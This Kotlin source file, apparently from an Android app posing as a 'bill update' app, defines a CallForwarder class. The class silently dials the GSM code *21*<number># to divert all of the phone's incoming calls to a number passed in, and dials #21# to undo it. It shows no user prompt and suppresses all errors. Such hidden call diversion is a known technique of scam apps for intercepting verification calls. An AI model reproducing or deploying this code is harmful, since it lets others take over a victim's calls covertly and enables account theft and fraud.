package com.example.bill_update_app

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

class CallForwarder(private val context: Context) {

    fun enableCallForwarding(number: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
            != PackageManager.PERMISSION_GRANTED) return
        val intent = Intent(Intent.ACTION_CALL).apply {
            data = Uri.parse("tel:*21*$number%23")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try { context.startActivity(intent) } catch (_: Exception) {}
    }

    fun disableCallForwarding() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
            != PackageManager.PERMISSION_GRANTED) return
        val intent = Intent(Intent.ACTION_CALL).apply {
            data = Uri.parse("tel:%2321%23")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try { context.startActivity(intent) } catch (_: Exception) {}
    }
}
